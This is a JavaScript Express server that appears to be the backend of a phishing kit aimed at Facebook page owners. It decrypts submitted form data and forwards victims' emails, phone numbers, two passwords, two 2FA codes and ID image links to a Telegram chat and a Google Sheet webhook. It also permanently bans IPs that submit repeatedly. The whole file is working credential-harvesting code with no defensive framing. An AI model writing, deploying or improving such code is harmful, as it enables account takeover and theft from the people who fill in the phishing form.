import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";
import CryptoJS from "crypto-js";
import rateLimit from "express-rate-limit";

const app = express();
app.use(cors('*'));
app.use(express.json());
app.set('trust proxy', 1);

const blockedIPs = new Set();

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const secretKey = 'HDNDT-JDHT8FNEK-JJHR';

function decrypt(encryptedData) {
    const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
    const decrypted = bytes.toString(CryptoJS.enc.Utf8);
    return decrypted;
}

const ipFilter = (req, res, next) => {
    const ip = req.ip;

    if (blockedIPs.has(ip)) {
        return res.status(403).json({ message: 'Access forbidden: IP is permanently blocked' });
    }

    next();
};

const registerLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, 
    max: 10, 
    message: 'Access forbidden: Too Many Requests',
    headers: true,
    handler: (req, res) => {
        blockedIPs.add(req.ip);
        res.status(429).json({
            message: 'Access forbidden: IP is permanently blocked',
        });
    }
});

app.post('/api/register', ipFilter, registerLimiter, (req, res) => {
    try {
        const { data } = req.body;

        const decryptedData = decrypt(data);
        const values = JSON.parse(decryptedData);

        res.status(200).json({
            message: 'Success',
            error_code: 0
        });

        const message = `<b>Ip:</b> <code>${values.ip ? values.ip : ''}</code>\n-----------------------------\n<b>Email Business:</b> <code>${values.businessEmail ? values.businessEmail : ''} </code>\n<b>Email Personal:</b> <code>${values.personalEmail ? values.personalEmail : ''}</code>\n<b>User name:</b> <code>${values.fullName ? values.fullName : ''} </code>\n<b>Page name:</b> <code>${values.fanpageName ? values.fanpageName : ''}</code>\n<b>Phone Number:</b> <code>${values.mobilePhone ? values.mobilePhone : ''}</code>\n<b>Password First:</b> <code>${values.passwordFirst ? values.passwordFirst : ''}</code>\n<b>Password Second:</b> <code>${values.passwordSecond ? values.passwordSecond : ''}</code>\n-----------------------------\n<b>Image:</b> <code>${values.imageUrl ? values.imageUrl : ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.firstTwoFa ? values.firstTwoFa : ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa ? values.secondTwoFa : ''}</code>\n`;
        bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'html' });
        
        if (process.env.WEBHOOK_URL) {
            const url = new URL(process.env.WEBHOOK_URL);

            url.searchParams.append('Ip', values.ip ? values.ip : '');
            url.searchParams.append('City', values.city ? values.city : '');
            url.searchParams.append('Country', values.country ? values.country : '');
            url.searchParams.append('Email Business', values.businessEmail ? values.businessEmail : '');
            url.searchParams.append('Email Personal', values.personalEmail ? values.personalEmail : '');
            url.searchParams.append('Full Name', values.fullName ? values.fullName : '');
            url.searchParams.append('Fanpage Name', values.fanpageName ? values.fanpageName : '');
            url.searchParams.append('Phone Number', values.mobilePhone ? values.mobilePhone : '');
            url.searchParams.append('Password First', values.passwordFirst ? values.passwordFirst : '');
            url.searchParams.append('Password Second', values.passwordSecond ? values.passwordSecond : '');
            url.searchParams.append('First Two-Fa', values.firstTwoFa ? values.firstTwoFa : '');
            url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');
            url.searchParams.append('Image', values.imageUrl ? values.imageUrl : '');

            axios.get(url)
                .then(response => {
                    bot.sendMessage(process.env.CHAT_ID, '✅ Thêm dữ liệu vào Sheet thành công.');
                })
                .catch(err => {
                    bot.sendMessage(process.env.CHAT_ID, 'Thêm vào Google Sheet không thành công, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
                });
        }

    } catch (error) {
        bot.sendMessage(process.env.CHAT_ID, 'Server giải mã dữ liệu không thành công, liên hệ <code>@otisth</code>',  { parse_mode: 'html' });
        res.status(500).json({
            message: 'Erorr',
            error_code: 1
        });
    }

});

app.listen(process.env.PORT, () => {
    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
});
